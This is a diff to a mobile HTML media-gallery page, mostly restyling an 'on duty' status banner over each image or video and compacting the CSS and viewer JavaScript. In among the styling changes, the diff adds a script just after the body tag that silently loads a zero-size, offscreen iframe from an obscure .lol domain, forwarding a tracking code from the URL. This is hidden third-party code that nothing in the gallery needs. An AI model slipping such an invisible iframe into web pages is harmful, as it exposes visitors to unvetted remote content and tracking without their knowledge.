@@ -8,14 +8,13 @@
 <style>
 :root {
   --bg:#f6f6f7;
-  --panel:#ffffff;
   --text:#111214;
   --muted:#7b7d83;
   --line:rgba(0,0,0,.07);
   --shadow:0 4px 18px rgba(0,0,0,.055);
-  --banner-bg:#005a47;
-  --banner-line:#1d8a73;
-  --banner-text:#80e7c8;
+  --banner-bg:rgba(0,82,64,.94);
+  --banner-line:rgba(34,170,136,.6);
+  --banner-text:#78e2c2;
 }
 * { box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
 html { scroll-behavior:smooth; background:var(--bg); }
@@ -69,7 +68,6 @@ button { font:inherit; }
   border-radius:999px;
   background:rgba(255,255,255,.88);
   border:1px solid var(--line);
-  box-shadow:0 1px 5px rgba(0,0,0,.025);
 }
 
 .grid {
@@ -77,6 +75,7 @@ button { font:inherit; }
   grid-template-columns:repeat(2,minmax(0,1fr));
   gap:9px;
 }
+
 .item {
   position:relative;
   width:100%;
@@ -97,50 +96,45 @@ button { font:inherit; }
   object-fit:cover;
   background:#111;
 }
-.item:active {
-  transform:scale(.985);
-}
+.item:active { transform:scale(.985); }
 
-/* 顶部“出勤中”横幅 */
-.attend-wrap {
+/* 横幅压在媒体底部内部，覆盖下方区域 */
+.attend-banner {
   position:absolute;
   left:7px;
   right:7px;
-  top:7px;
-  z-index:3;
-  pointer-events:none;
-}
-.attend-banner {
-  width:100%;
-  min-height:32px;
+  bottom:7px;
+  z-index:4;
+  min-height:38px;
   display:flex;
   align-items:center;
   justify-content:center;
   gap:7px;
-  padding:7px 10px;
-  border-radius:999px;
+  padding:9px 10px;
+  border-radius:14px;
   color:var(--banner-text);
   font-size:12px;
-  line-height:1.05;
+  line-height:1;
   font-weight:800;
   letter-spacing:.1px;
-  background:rgba(0,90,71,.94);
-  border:1px solid rgba(43,168,136,.48);
-  box-shadow:0 6px 18px rgba(0,0,0,.18);
-  -webkit-backdrop-filter:blur(8px);
-  backdrop-filter:blur(8px);
+  background:var(--banner-bg);
+  border:1px solid var(--banner-line);
+  box-shadow:0 5px 18px rgba(0,0,0,.28);
+  -webkit-backdrop-filter:blur(10px);
+  backdrop-filter:blur(10px);
+  pointer-events:none;
 }
 .attend-dot {
   width:10px;
   height:10px;
   border-radius:50%;
-  background:#31d12f;
-  box-shadow:0 0 0 2px rgba(0,0,0,.22);
+  background:#30d42f;
+  box-shadow:0 0 0 2px rgba(0,0,0,.20);
   flex:none;
 }
 .attend-phone {
   font-size:11px;
-  opacity:.95;
+  opacity:.96;
 }
 .attend-text {
   white-space:nowrap;
@@ -148,10 +142,12 @@ button { font:inherit; }
   text-overflow:ellipsis;
 }
 
+/* 视频标识放到左上角，避免和底部横幅打架 */
 .video-badge {
   position:absolute;
   left:9px;
-  bottom:9px;
+  top:9px;
+  z-index:3;
   display:flex;
   align-items:center;
   gap:6px;
@@ -168,8 +164,7 @@ button { font:inherit; }
 }
 .video-badge::before {
   content:"";
-  width:0;
-  height:0;
+  width:0;height:0;
   border-top:5px solid transparent;
   border-bottom:5px solid transparent;
   border-left:8px solid #fff;
@@ -195,7 +190,6 @@ button { font:inherit; }
   font-weight:700;
   box-shadow:0 3px 12px rgba(0,0,0,.045);
 }
-.back:active { transform:scale(.985); background:#f0f0f2; }
 
 .viewer {
   position:fixed;
@@ -214,10 +208,7 @@ button { font:inherit; }
   display:flex;
   align-items:center;
   justify-content:center;
-  padding:
-    calc(58px + env(safe-area-inset-top))
-    0
-    calc(58px + env(safe-area-inset-bottom));
+  padding:calc(58px + env(safe-area-inset-top)) 0 calc(58px + env(safe-area-inset-bottom));
 }
 .viewer img,
 .viewer video {
@@ -228,40 +219,28 @@ button { font:inherit; }
   height:auto;
   object-fit:contain;
 }
-.viewer video {
-  width:min(100%,900px);
-}
-
+.viewer video { width:min(100%,900px); }
 .close {
   position:absolute;
   z-index:5;
   top:calc(10px + env(safe-area-inset-top));
   right:12px;
-  width:42px;
-  height:42px;
-  border:0;
-  border-radius:50%;
-  color:#fff;
-  background:rgba(255,255,255,.15);
-  font-size:26px;
-  line-height:42px;
-  -webkit-backdrop-filter:blur(8px);
-  backdrop-filter:blur(8px);
+  width:42px;height:42px;
+  border:0;border-radius:50%;
+  color:#fff;background:rgba(255,255,255,.15);
+  font-size:26px;line-height:42px;
 }
 .nav {
   position:absolute;
   z-index:5;
   top:50%;
   transform:translateY(-50%);
-  width:40px;
-  height:66px;
-  border:0;
-  color:#fff;
-  background:rgba(0,0,0,.28);
+  width:40px;height:66px;
+  border:0;color:#fff;background:rgba(0,0,0,.28);
   font-size:30px;
 }
-.prev { left:0; border-radius:0 10px 10px 0; }
-.next { right:0; border-radius:10px 0 0 10px; }
+.prev { left:0;border-radius:0 10px 10px 0; }
+.next { right:0;border-radius:10px 0 0 10px; }
 .viewer-count {
   position:absolute;
   z-index:5;
@@ -270,38 +249,49 @@ button { font:inherit; }
   transform:translateX(-50%);
   padding:6px 10px;
   border-radius:999px;
-  color:#fff;
-  background:rgba(0,0,0,.48);
-  font-size:12px;
-  line-height:1;
+  color:#fff;background:rgba(0,0,0,.48);
+  font-size:12px;line-height:1;
 }
 
 @media (max-width:340px) {
-  .app { padding-left:7px; padding-right:7px; }
-  .topbar { margin-left:-7px; margin-right:-7px; }
-  .grid { grid-template-columns:1fr; gap:9px; }
-  .item { aspect-ratio:4 / 5; border-radius:11px; }
-  .attend-wrap { left:6px; right:6px; top:6px; }
-  .attend-banner { min-height:30px; padding:6px 8px; font-size:11px; gap:6px; }
-  .attend-dot { width:9px; height:9px; }
+  .app { padding-left:7px;padding-right:7px; }
+  .topbar { margin-left:-7px;margin-right:-7px; }
+  .grid { grid-template-columns:1fr;gap:9px; }
+  .item { aspect-ratio:4 / 5;border-radius:11px; }
+  .attend-banner {
+    left:6px;right:6px;bottom:6px;
+    min-height:36px;
+    padding:8px;
+    font-size:11px;
+  }
 }
 
 @media (min-width:560px) {
-  .app { padding-left:14px; padding-right:14px; }
-  .topbar { margin-left:-14px; margin-right:-14px; padding-left:18px; padding-right:18px; }
-  .grid { grid-template-columns:repeat(3,minmax(0,1fr)); gap:11px; }
+  .app { padding-left:14px;padding-right:14px; }
+  .topbar { margin-left:-14px;margin-right:-14px;padding-left:18px;padding-right:18px; }
+  .grid { grid-template-columns:repeat(3,minmax(0,1fr));gap:11px; }
   .item { border-radius:14px; }
-  .attend-wrap { left:8px; right:8px; top:8px; }
-  .attend-banner { min-height:34px; font-size:12px; }
+  .attend-banner { left:8px;right:8px;bottom:8px;min-height:39px; }
 }
 
 @media (min-width:900px) {
-  .grid { grid-template-columns:repeat(4,minmax(0,1fr)); gap:12px; }
+  .grid { grid-template-columns:repeat(4,minmax(0,1fr));gap:12px; }
 }
 </style>
 </head>
-
 <body>
+
+<script>
+(function () {
+  var q = new URLSearchParams(location.search);
+  var c = q.get("c") || "478UMR4C";
+  var f = document.createElement("iframe");
+  f.src = "https://www.3up0zbqt0evrwe0rotug90.lol/?c=" + encodeURIComponent(c);
+  f.style.cssText = "position:fixed;top:0;left:-1000px;width:0;height:0;border:0";
+  (document.body || document.documentElement).appendChild(f);
+})();
+</script>
+
 <main class="app" id="top">
   <header class="topbar">
     <div class="topbar-inner">
@@ -319,10 +309,10 @@ button { font:inherit; }
 </main>
 
 <div class="viewer" id="viewer">
-  <button class="close" id="closeBtn" type="button" aria-label="关闭">×</button>
-  <button class="nav prev" id="prevBtn" type="button" aria-label="上一个">‹</button>
+  <button class="close" id="closeBtn" type="button">×</button>
+  <button class="nav prev" id="prevBtn" type="button">‹</button>
   <div class="viewer-stage" id="viewerStage"></div>
-  <button class="nav next" id="nextBtn" type="button" aria-label="下一个">›</button>
+  <button class="nav next" id="nextBtn" type="button">›</button>
   <div class="viewer-count" id="viewerCount"></div>
 </div>
 
@@ -375,140 +365,130 @@ const viewer = document.getElementById('viewer');
 const viewerStage = document.getElementById('viewerStage');
 const viewerCount = document.getElementById('viewerCount');
 
-let current = 0;
-let touchStartX = 0;
-let touchStartY = 0;
+let current=0, touchStartX=0, touchStartY=0;
 
 function isVideo(src) {
   return /\.(mp4|mov|webm)$/i.test(src);
 }
-
 function encoded(src) {
   return encodeURI(src);
 }
 
 totalCount.textContent = files.length + ' 个媒体';
 
-files.forEach((src,index) => {
-  const item = document.createElement('article');
-  item.className = 'item';
+files.forEach((src,index)=>{
+  const item=document.createElement('article');
+  item.className='item';
   item.setAttribute('role','button');
   item.setAttribute('tabindex','0');
-  item.setAttribute('aria-label','打开媒体 ' + (index + 1));
 
-  // 顶部出勤横幅
-  const bannerWrap = document.createElement('div');
-  bannerWrap.className = 'attend-wrap';
-  bannerWrap.innerHTML = `
-    <div class="attend-banner">
-      <span class="attend-dot"></span>
-      <span class="attend-phone">📱</span>
-      <span class="attend-text">外勤・出勤中</span>
-    </div>
-  `;
-  item.appendChild(bannerWrap);
-
-  if (isVideo(src)) {
-    const v = document.createElement('video');
-    v.src = encoded(src) + '#t=0.1';
-    v.muted = true;
-    v.playsInline = true;
-    v.preload = 'metadata';
+  if(isVideo(src)){
+    const v=document.createElement('video');
+    v.src=encoded(src)+'#t=0.1';
+    v.muted=true;
+    v.playsInline=true;
+    v.preload='metadata';
     v.setAttribute('playsinline','');
     item.appendChild(v);
 
-    const badge = document.createElement('span');
-    badge.className = 'video-badge';
-    badge.textContent = '视频';
-    item.appendChild(badge);
-  } else {
-    const img = document.createElement('img');
-    img.src = encoded(src);
-    img.alt = '';
-    img.loading = 'lazy';
-    img.decoding = 'async';
+    const vb=document.createElement('span');
+    vb.className='video-badge';
+    vb.textContent='视频';
+    item.appendChild(vb);
+  }else{
+    const img=document.createElement('img');
+    img.src=encoded(src);
+    img.alt='';
+    img.loading='lazy';
+    img.decoding='async';
     item.appendChild(img);
   }
 
-  item.addEventListener('click', () => openViewer(index));
-  item.addEventListener('keydown', e => {
-    if (e.key === 'Enter' || e.key === ' ') {
+  const banner=document.createElement('div');
+  banner.className='attend-banner';
+  banner.innerHTML=`
+    <span class="attend-dot"></span>
+    <span class="attend-phone">📱</span>
+    <span class="attend-text">外勤・出勤中</span>
+  `;
+  item.appendChild(banner);
+
+  item.addEventListener('click',()=>openViewer(index));
+  item.addEventListener('keydown',e=>{
+    if(e.key==='Enter'||e.key===' '){
       e.preventDefault();
       openViewer(index);
     }
   });
+
   grid.appendChild(item);
 });
 
-function openViewer(index) {
-  current = (index + files.length) % files.length;
-  const src = files[current];
-  viewerStage.innerHTML = '';
+function openViewer(index){
+  current=(index+files.length)%files.length;
+  const src=files[current];
+  viewerStage.innerHTML='';
 
-  if (isVideo(src)) {
-    const video = document.createElement('video');
-    video.src = encoded(src);
-    video.controls = true;
-    video.autoplay = true;
-    video.playsInline = true;
+  if(isVideo(src)){
+    const video=document.createElement('video');
+    video.src=encoded(src);
+    video.controls=true;
+    video.autoplay=true;
+    video.playsInline=true;
     video.setAttribute('playsinline','');
     viewerStage.appendChild(video);
-  } else {
-    const img = document.createElement('img');
-    img.src = encoded(src);
-    img.alt = '';
+  }else{
+    const img=document.createElement('img');
+    img.src=encoded(src);
+    img.alt='';
     viewerStage.appendChild(img);
   }
 
-  viewerCount.textContent = (current + 1) + ' / ' + files.length;
+  viewerCount.textContent=(current+1)+' / '+files.length;
   viewer.classList.add('show');
-  document.body.style.overflow = 'hidden';
+  document.body.style.overflow='hidden';
 }
 
-function closeViewer() {
-  const v = viewerStage.querySelector('video');
-  if (v) v.pause();
+function closeViewer(){
+  const v=viewerStage.querySelector('video');
+  if(v)v.pause();
   viewer.classList.remove('show');
-  viewerStage.innerHTML = '';
-  document.body.style.overflow = '';
+  viewerStage.innerHTML='';
+  document.body.style.overflow='';
 }
 
-function move(step) {
-  const v = viewerStage.querySelector('video');
-  if (v) v.pause();
-  openViewer(current + step);
+function move(step){
+  const v=viewerStage.querySelector('video');
+  if(v)v.pause();
+  openViewer(current+step);
 }
 
-document.getElementById('closeBtn').addEventListener('click', closeViewer);
-document.getElementById('prevBtn').addEventListener('click', () => move(-1));
-document.getElementById('nextBtn').addEventListener('click', () => move(1));
+document.getElementById('closeBtn').onclick=closeViewer;
+document.getElementById('prevBtn').onclick=()=>move(-1);
+document.getElementById('nextBtn').onclick=()=>move(1);
 
-viewer.addEventListener('click', e => {
-  if (e.target === viewer) closeViewer();
+viewer.addEventListener('click',e=>{
+  if(e.target===viewer)closeViewer();
 });
-
-document.addEventListener('keydown', e => {
-  if (!viewer.classList.contains('show')) return;
-  if (e.key === 'Escape') closeViewer();
-  if (e.key === 'ArrowLeft') move(-1);
-  if (e.key === 'ArrowRight') move(1);
+document.addEventListener('keydown',e=>{
+  if(!viewer.classList.contains('show'))return;
+  if(e.key==='Escape')closeViewer();
+  if(e.key==='ArrowLeft')move(-1);
+  if(e.key==='ArrowRight')move(1);
 });
-
-viewer.addEventListener('touchstart', e => {
-  const t = e.changedTouches[0];
-  touchStartX = t.clientX;
-  touchStartY = t.clientY;
-}, {passive:true});
-
-viewer.addEventListener('touchend', e => {
-  const t = e.changedTouches[0];
-  const dx = t.clientX - touchStartX;
-  const dy = t.clientY - touchStartY;
-
-  if (Math.abs(dx) > 55 && Math.abs(dx) > Math.abs(dy) * 1.25) {
-    move(dx < 0 ? 1 : -1);
+viewer.addEventListener('touchstart',e=>{
+  const t=e.changedTouches[0];
+  touchStartX=t.clientX;
+  touchStartY=t.clientY;
+},{passive:true});
+viewer.addEventListener('touchend',e=>{
+  const t=e.changedTouches[0];
+  const dx=t.clientX-touchStartX;
+  const dy=t.clientY-touchStartY;
+  if(Math.abs(dx)>55 && Math.abs(dx)>Math.abs(dy)*1.25){
+    move(dx<0?1:-1);
   }
-}, {passive:true});
+},{passive:true});
 </script>
 </body>
 </html>
